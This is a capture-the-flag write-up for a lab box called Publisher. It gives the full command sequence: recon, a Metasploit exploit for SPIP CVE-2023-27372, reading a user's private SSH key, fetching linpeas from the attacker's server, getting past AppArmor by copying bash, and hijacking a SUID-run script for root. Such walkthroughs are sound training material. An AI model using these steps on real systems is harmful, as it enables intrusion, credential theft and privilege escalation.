# Publisher - Easy

```sh
sudo vim /etc/hosts
# map publisher.thm to IP

nmap -T4 -p- -A -Pn -v
```

* Open ports & services:

    * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.10
    * 80/tcp - http - Apache httpd 2.4.41

* The page on port 80 is for a community magazine "Publisher's Pulse: SPIP Insights & Tips"; within the webpage itself, there is not a lot of useful info and no links leading to other sections

* The webpage, designed by TemplateMo, looks very old in design - we can look for any components to exploit

* Web enumeration:

    ```sh
    feroxbuster -u http://publisher.thm -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,bak,bac,md,jpg,png,ps1,js,txt,json,docx,pdf,zip,cgi,sh,pl,aspx,sql,xml --extract-links --scan-limit 2 --filter-status 400,401,404,405,500 --silent
    # directory scan
    ```

* From the directory scan, we find the '/spip' directory; this is for the SPIP web publishing system mentioned earlier in the homepage

* The source code shows the page on '/spip' is using SPIP version 4.2.0 (we can check this using Wappalyzer extension too)

* Googling for exploits related to SPIP 4.2.0 give us [CVE-2023-27372, unauthenticated RCE exploit](https://www.exploit-db.com/exploits/51536) - we can use this exploit, but it does not work

* There is an [exploit on GitHub as well for CVE-2023-27372](https://github.com/nuts7/CVE-2023-27372) but it does not work; we can search in Metasploit:

    ```sh
    msfconsole -q

    search spip
    # we have this exploit

    use exploit/unix/webapp/spip_rce_form

    options

    set RHOSTS publisher.thm
    set TARGETURI /spip
    set LHOST tun0

    run
    # run the exploit
    # we get a Meterpreter shell

    shell
    # launch a shell

    id
    # www-data

    hostname
    # random string, this could imply it is a Docker env

    ls -la /
    # it is a container, as this includes the .dockerenv file

    pwd
    # we are in home directory of 'think' user

    ls -la /home
    # there are no other users

    ls -la /home/think
    # we have a .ssh directory

    ls -la /home/think/.ssh
    # check if we can read the keys

    cat /home/think/.ssh/id_rsa
    # we can view this
    # copy this key contents

    # in attacker machine
    vim id_rsa
    # paste the SSH key here

    # we can confirm if the contents have been copied correctly using md5sum

    # reqd permission
    chmod 600 id_rsa

    ssh -i id_rsa think@publisher.thm
    # it does not ask for a password - we can SSH login now

    cat user.txt
    # user flag
    ```

* Now, we can enumerate further as 'think' user with ```linpeas``` and basic enumeration steps:

    ```sh
    # on attacker
    python3 -m http.server

    # in victim SSH
    cd /tmp

    wget http://10.14.63.75:8000/linpeas.sh
    # permission denied error
    # we cannot write to this directory it seems

    # we test in our home directory but cannot write there too

    # search for any other world-writable directory
    find / -perm -222 -type d 2>/dev/null
    # this gives a list of directories

    # we can try in all of those directories
    cd /var/tmp

    wget http://10.14.63.75:8000/linpeas.sh
    # we are able to write to in this folder

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* ```linpeas``` shows we have an unknown SUID & SGID binary ```/usr/sbin/run_container``` - we can check it further

* By running the binary ```/usr/sbin/run_container```, we get a list of Docker containers with container ID & name - currently there is only one container; we also get a prompt to enter container ID or to create a new one

* If we enter the existing container ID, we can see an error ```/opt/run_container.sh: line 16: validate_container_id: command not found``` - and we also have options to start, stop, restart or create container, or quit

* For now we can quit; the container ID seen here is the same as the hostname seen earlier in the reverse shell as ```www-data```

* We can check the binary further using ```strings``` - this mentions ```/bin/bash``` and ```/opt/run_container.sh```

* If we try to read the binary itself using ```cat```, it mentions ```/bin/bash -p /opt/run_container.sh``` - the ```-p``` flag is for 'privileged', and is used for scripts which need elevated privileges

* As for the script itself, we are not able to view the contents of ```/opt``` but the script, owned by root, is world-writable:

    ```sh
    ls -la /opt
    # permission denied

    ls -la /opt/run_container.sh
    # we can read and write to this

    cat /opt/run_container.sh

    vim /opt/run_container.sh
    # does not work
    ```

* We can try writing and injecting to the script but it does not work

* Based on the multiple restrictions seen (cannot write in /tmp, cannot read /opt, etc.), and as the room description and hint suggest, the box is using AppArmor

* We can [enumerate AppArmor](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/apparmor):

    ```sh
    # AppArmor profiles saved in /etc/apparmor.d/

    ls -la /etc/apparmor*

    # apparmor.d contains various profiles
    # it also mentions 'ash'

    cat /etc/passwd
    # 'ash' is the shell that the 'think' user is assigned

    echo $0
    # another way to check which shell is running

    cat /etc/apparmor.d/usr.sbin.ash
    # lists all the restrictions for our shell
    ```

* From the profile config for ```/usr/sbin/ash``` shell, we can see these rules (used AI for this):

    * ```deny /opt/ r``` - denies read access to ```/opt/```
    * ```deny /opt/** w``` - denies write access to all files & subdirectories under ```/opt/```
    * ```deny /tmp/** w``` - denies write access to all files & subdirectories under ```/tmp/```
    * ```deny /dev/shm w``` - denies write access to shared memory files in ```/dev/shm/```
    * ```deny /var/tmp w``` - denies write access to ```/var/tmp```
    * ```deny /home/** w``` - denies write access to all user home directories
    * ```/usr/bin/** mrix``` - grants apps permissions to modify, read, inherit and execute in ```/usr/bin/```
    * ```/usr/sbin/** mrix``` - grants apps permissions to modify, read, inherit and execute in ```/usr/sbin/```

* The rules seem to be configured to block writing to all temporary directories, but as we were able to write to ```/var/tmp``` earlier for ```linpeas```, it is apparent the rules are not complete - it does not explicitly deny write access to all files and subdirectories under ```/var/tmp``` (or ```/dev/shm```), like it does for ```/tmp``` (using ```/tmp/**```)

* Also, as the rules are applicable to ```ash``` shell, we can try switching to ```bash``` shell, so that AppArmor rules do not apply anymore:

    ```sh
    cp /bin/bash /var/tmp/bash
    # copy it to the writable directory

    cd /var/tmp

    ./bash
    
    echo $0
    # now we are in bash shell
    # so the AppArmor rules should not apply - we can test this

    ls -la /opt
    # we can list the contents now
    
    # now we can modify the script which we were not able to previously
    echo -e '#!/bin/bash\ncp /bin/bash /var/tmp/another_bash\nchmod +s /var/tmp/another_bash' > /opt/run_container.sh

    # confirm the script changed
    cat /opt/run_container.sh

    # now we can run the SUID binary
    /usr/sbin/run_container

    # check bash has been copied by root and assigned SUID bit
    # this works because the original script uses '-p' flag
    ls -la /var/tmp

    /var/tmp/another_bash -p
    # we get root
    ```
